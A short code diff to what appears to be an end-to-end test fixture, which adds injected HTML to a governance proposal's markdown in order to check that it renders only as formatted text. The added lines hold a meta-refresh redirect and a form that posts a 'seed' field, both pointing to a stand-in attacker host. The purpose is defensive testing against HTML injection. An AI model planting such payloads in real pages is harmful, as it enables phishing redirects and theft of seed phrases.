@@ -116,7 +116,13 @@ function world(maintainer: string, member = true) {
         "[[PRINCIPALS]]",
         'github = "demo-dev"',
       ].join("\n"),
-      [`${PROPOSAL_CID}/proposal.md`]: "We adopt the Contributor Covenant.",
+      // With what a proposer could slip in: only its formatting shows.
+      [`${PROPOSAL_CID}/proposal.md`]: [
+        "We adopt the Contributor Covenant.",
+        '<meta http-equiv="refresh" content="0;url=https://evil.e2e.test/">',
+        '<form action="https://evil.e2e.test/"><input name="seed"></form>',
+        "```\nif (a < b && c) {}\n```",
+      ].join("\n\n"),
       [`${PROPOSAL_CID}/outcomes.json`]: JSON.stringify({
         outcomes: {
           approved: { description: "Merge the code of conduct." },
